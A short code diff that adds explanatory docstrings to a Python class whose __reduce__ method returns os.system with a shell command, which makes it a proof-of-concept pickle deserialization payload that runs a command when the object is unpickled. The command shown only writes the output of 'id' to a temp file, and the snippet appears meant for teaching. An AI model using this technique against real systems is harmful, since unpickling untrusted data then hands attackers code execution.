@@ -3,7 +3,15 @@ import os
 import requests
 
 class MyObject(object):
+    """
+    Create an object that implemens the __reduce__ method
+    """
     def __reduce__(self):
+        """
+        https://docs.python.org/3/library/pickle.html#object.__reduce__
+        The __reduce__ method here returns a callable object
+        and the arguments to pass to that object.
+        """
         return os.system, ('id > /tmp/cmd',)
 
 o = MyObject()
